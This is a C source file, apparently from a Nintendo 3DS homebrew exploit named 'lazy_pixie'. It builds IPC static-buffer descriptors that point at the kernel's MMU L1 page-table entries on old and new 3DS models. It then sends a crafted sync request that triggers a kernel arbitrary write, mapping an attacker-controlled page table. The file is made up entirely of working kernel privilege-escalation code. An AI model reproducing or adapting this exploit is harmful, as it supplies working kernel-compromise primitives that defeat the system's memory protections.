#include "lazy_pixie.h"

u32 lazyPixiePrepareStaticBufferDescriptors(u32 *sbufs, u32 baseId)
{
    u32 id = baseId;

    // Here we create a MMU entry, L1 entry mapping a page table (client will set bits 1 and 0 accordingly), to map MAP_ADDR
    sbufs[0] = IPC_Desc_StaticBuffer(0, id++); // size = 0 because the kernel doesn't care when writing & avoids a va2pa that would lead to a crash
    sbufs[1] = KERNPA2VA(0x1FFF8000) + (MAP_ADDR >> 20) * 4;

    sbufs[2] = IPC_Desc_StaticBuffer(0, id++); // size = 0 because the kernel doesn't care when writing & avoids a va2pa that would lead to a crash
    sbufs[3] = KERNPA2VA(0x1FFFC000) + (MAP_ADDR >> 20) * 4;

    // N3DS-only, the following static buffers won't be used on O3DS:
    sbufs[4] = IPC_Desc_StaticBuffer(0, id++); // size = 0 because the kernel doesn't care when writing & avoids a va2pa that would lead to a crash
    sbufs[5] = KERNPA2VA(0x1F3FC000) + (MAP_ADDR >> 20) * 4;

    sbufs[6] = IPC_Desc_StaticBuffer(0, id++); // size = 0 because the kernel doesn't care when writing & avoids a va2pa that would lead to a crash
    sbufs[7] = KERNPA2VA(0x1FFF7000) + (MAP_ADDR >> 20) * 4;

    return 4;
}

Result lazyPixieTriggerArbwrite(BlobLayout *layout, Handle handle, u32 baseSbufId)
{
    Result res = 0;
    u32 *cmdbuf = getThreadCommandBuffer();

    // We assume our static buffers descriptors have already been injected
    // Trigger the kernel arbwrite
    u32 numCores = IS_N3DS ? 4 : 2;
    cmdbuf[0] = IPC_MakeHeader(0xCAFE, 0, 2 + 2 * numCores);
    for (u32 i = 0; i < numCores; i++) {
        cmdbuf[1 + 2 * i]       = IPC_Desc_PXIBuffer(4, baseSbufId + i, false);
        cmdbuf[1 + 2 * i + 1]   = (u32)layout->l2table | 1; // P=0 Domain=0000 (client), coarse page table
    }

    TRY(svcSendSyncRequest(handle));

    __dsb();
    __flush_prefetch_buffer();

    return res;
}
